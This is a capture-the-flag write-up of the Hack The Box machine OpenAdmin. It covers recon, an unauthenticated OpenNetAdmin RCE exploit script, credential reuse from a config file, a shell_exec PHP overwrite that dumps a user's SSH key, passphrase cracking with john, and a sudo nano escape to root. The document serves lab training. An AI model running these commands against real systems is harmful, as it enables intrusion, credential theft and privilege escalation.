---
title: "HTB: OpenAdmin — Writeup"
date: 2026-09-22 12:00:00 -0500
categories: [Hack The Box, Writeups]
tags: [linux, opennetadmin, rce, ssh, john, gtfobins, privesc, easy]
---

OpenAdmin is a retired Easy Linux box on Hack The Box. The foothold comes from an outdated OpenNetAdmin installation exposed through a hidden subdirectory where I exploited an RCE vulnerability within this subdirectory. I got the user flag via credential reuse, reading a PHP source file, and cracking an encrypted SSH key. For privilege escalation I used a GTFOBins nano escape through a misconfigured sudo rule.

---

## Recon

I started reconnaissance with a full TCP scan with version detection and default scripts:

```bash
nmap -sV -sC -oA OpenAdmin -p- --min-rate 1000 10.129.90.87
```

![nmap scan](/assets/img/posts/openadmin/nmap_scan.png)

Two open ports:

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.6p1 (Ubuntu) |
| 80 | HTTP | Apache httpd 2.4.29 (Ubuntu) |

SSH needs creds that I don't have yet, so I focused on the open web port.

---

## Enumeration

### Port 80

I went to the webpage and found the default Apache2 web server page. I then turned to gobuster to find any subdirectories.

```bash
gobuster dir -u http://10.129.90.87 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt -t 50
```

![gobuster scan](/assets/img/posts/openadmin/gobuster_scan.png)

Two directories came back: `/music/` and `/artwork/`. Both return 301 redirects to actual webpages. My next step was to investigate these subdirectories.

### /artwork/

I found that the /artwork/ subdirectory was a dead end. It was a real webpage but yielded no valuable information after I visited it.

![artwork page](/assets/img/posts/openadmin/artwork.png)

### /music/

This webpage seemed to be similar to the /artwork/ subdirectory as there was nothing I initially found surprising. There was a login page I clicked and was redirected.

![music page](/assets/img/posts/openadmin/music.png)

### OpenNetAdmin

`/ona/` was the subdirectory that I was redirected to after clicking the login link. 

![ONA dashboard](/assets/img/posts/openadmin/ona_webpage.png)

The version number jumped out at me so I ran it through searchsploit to see if it was a vulnerable version of OpenAdmin.
---

## Foothold: OpenNetAdmin RCE

Searching for ONA exploits with searchsploit returns three results:

```bash
searchsploit opennetadmin
```

![searchsploit results](/assets/img/posts/openadmin/searchsploit.png)

| EDB ID | Type | Notes |
|--------|------|-------|
| 47691.sh | Bash script | Unauth RCE |
| 47772.rb | Metasploit module | metasploit module|
| 26682.txt | Text PoC | reference |

I decided to go with the bash script so I mirrored it and changed permissions so it could be executable.

```bash
searchsploit -m php/webapps/47691.sh
chmod +x 47691.sh
```

![chmod and mirror](/assets/img/posts/openadmin/chmod.png)

The exploit works by passing user input directly into a shell. I ran the script against the target.

```bash
./47691.sh http://10.129.90.87/ona/
```

This drops into a limited pseudo-shell running as `www-data`. It's enough to enumerate the box and look for credentials.

> The URL argument must point to the ONA directory with a trailing slash. Running the script with no argument produces curl errors.

---

## Lateral Movement: www-data → jimmy

### Config File Hunting

As `www-data` I can't access user home directories, but I can read the web application's config files. ONA connects to a database, and that connection string lives on disk in plaintext:

```bash
cat /var/www/html/ona/local/config/database_settings.inc.php
```

![database config](/assets/img/posts/openadmin/config_file.png)

Database credentials found:
- **User:** `ona_sys`
- **Password:** `n1nj4W4rri0R!`

### SSH as Jimmy

Two users exist on the box: `jimmy` and `joanna`. Tried the database password against both via SSH:

```bash
ssh jimmy@10.129.90.87
# password: n1nj4W4rri0R!
```

Authenticated as `jimmy`.

---

## Lateral Movement: jimmy → joanna

### Internal Service Discovery

After landing as jimmy, I checked for internal services not visible from outside:

```bash
ss -tlnp
```

A service is listening on `127.0.0.1:52846` Curling it returns a login form for an internal PHP web app.

### Reading the Source

Jimmy owns `/var/www/internal/`, so I read the PHP directly rather than trying to authenticate through the form:

- `index.php`: login form with a sha512 credential check, redirects to `main.php` on success
- `main.php`: runs `cat /home/joanna/.ssh/id_rsa` and prints the output

Since jimmy owns the files, I overwrote `main.php` to strip the session gate entirely:

```bash
echo '<?php $output = shell_exec("cat /home/joanna/.ssh/id_rsa"); echo "<pre>$output</pre>"; ?>' > /var/www/internal/main.php
curl http://127.0.0.1:52846/main.php
```

![joanna SSH key](/assets/img/posts/openadmin/joanna_sshkey.png)

Joanna's encrypted RSA private key printed directly to the terminal.

### Cracking the Key

The key is AES-128-CBC encrypted and it needs a passphrase. I converted it to a john-compatible format and ran it against rockyou:

```bash
ssh2john ~/Downloads/joanna_id_rsa > joanna.hash
john joanna.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Cracked instantly: **`bloodninjas`**

### SSH as Joanna

```bash
ssh -i ~/Downloads/joanna_id_rsa joanna@10.129.90.87
# passphrase: bloodninjas
```

![joanna shell](/assets/img/posts/openadmin/joanna_shell.png)

### User Flag

```bash
cat ~/user.txt
```

![user flag](/assets/img/posts/openadmin/userflag.png)

---

## Privilege Escalation

I checked sudo permissions on the new user.

```bash
sudo -l
```

```
User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Joanna can run nano on `/opt/priv` as root with no password. Nano running as root can execute shell commands.

```bash
sudo /bin/nano /opt/priv
```

Inside nano:
1. `Ctrl+R` (Read File prompt appears)
2. `Ctrl+X` (switches to Execute Command)
3. Type: `reset; sh 1>&0 2>&0` and hit Enter

![privesc](/assets/img/posts/openadmin/priv_esc.png)

A root shell spawns inside the editor. Confirmed with `whoami`, then grabbed the flag:

```bash
cd /root
cat root.txt
```

![root flag](/assets/img/posts/openadmin/root_flag.png)

Rooted.

---

## Takeaways

- **The default page is never the whole story.** The Apache landing page looked empty, but directory enumeration found the actual attack surface hiding in `/music/` and `/ona/`.
- **Always check `ss -tlnp` after every foothold.** The internal service on port 52846 was the entire path to joanna. Nmap never saw it because it was bound to localhost.
- **Credential reuse chains.** One database password authenticated as jimmy on SSH. File ownership got the key. A cracked passphrase finished the lateral move. Three pivots from a single credential.
- **File ownership beats file permissions.** Jimmy couldn't read joanna's SSH key directly, but he owned the PHP file that reads it — so he just rewrote the file.
- **`sudo -l` first, always.** Any editor or pager running as root is a full privesc. GTFOBins documents them all: nano, vim, less, more, python, perl. Check it before anything else on a new user.
